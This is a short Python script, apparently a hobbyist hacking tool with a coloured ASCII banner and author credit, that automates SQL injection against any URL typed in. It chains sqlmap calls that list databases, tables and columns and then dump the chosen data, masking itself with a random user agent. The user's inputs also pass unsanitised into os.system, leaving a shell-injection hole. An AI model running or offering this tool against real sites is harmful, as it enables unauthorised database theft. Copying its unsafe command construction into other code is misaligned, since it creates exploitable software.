#!/usr/bin/python
print('''
/  |  /  |                                                              
\033[096m$$\033[097m | /\033[91m$$\033[097m/   ______  \033[91m$$ |$$/       \033[92m$$$$$$$$/ $$/  __    __   ______    ______  
\033[096m$$\033[097m | \033[91m$$\033[097m/   /      \ \033[91m$$ |/  |      \033[92m$$ |__    /  |/  \  /  | /      \  /      \ 
\033[096m$$\033[097m  \033[91m$$\033[097m<    \033[93m$$$$$$  \033[097m|$$ |$$ |      \033[92m$$    |   $$ |$$  \/$$/ /$$$$$$  |/$$$$$$  |
\033[096m$$$$$  \033[097m\   /    \033[93m$$ |$$ |$$ |\033[097m      $$$$$/    \033[92m$$ | $$  $$<  $$    $$ |$$ |  $$/ 
\033[096m$$ \033[097m|\033[91m$$\033[097m  \ /\033[93m$$$$$$$ |\033[097m$$ |$$ |      \033[92m$$ |      $$ | /$$$$  \ $$$$$$$$/ $$ |      
\033[096m$$ \033[097m| \033[91m$$\033[097m  |\033[93m$$    $$ \033[097m|\033[91m$$ |\033[92m$$ |      $$ |      $$ |/$$/ $$  |$$       |$$ |      
\033[096m$$\033[097m/   \033[91m$$\033[097m/  \033[93m$$$$$$$\033[097m/\033[91m $$/\033[92m $$/       $$/       $$/ $$/   $$/  $$$$$$$/ $$/       
                                                                               
\033[097m+-----------------------------------------+
|\033[097m #Author:     \033[096mLamani Hani VEGETA-LFH\033[097m     |
|\033[097m#Contact: \033[096mhttps://www.facebook.com/Abdul.Rahman1Emad\033[097m    |
|\033[097m#Date:          \033[096m20/1/2018\033[097m               |
+-----------------------------------------+
''')


import os 

url = input('Enter url: ')
sqlmap1 = os.system('sqlmap --url {} --dbs --random-agent'.format(url))
dbs = input('Enter dbs: ')
sqlmap2 = os.system('sqlmap --url {} -D {} --tables --random-agent'.format(url,dbs))
tap1 = input('Enter tab : ')
sqlmap3 = os.system('sqlmap --url {} -D {} -T {} --columns --random-agent'.format(url,dbs,tap1))
colm = input('Enter colm: ')
sqlmap4 = os.system('sqlmap --url {} -D {} -T {} -c {} --dump --random-agent'.format(url,dbs,tap1,colm))
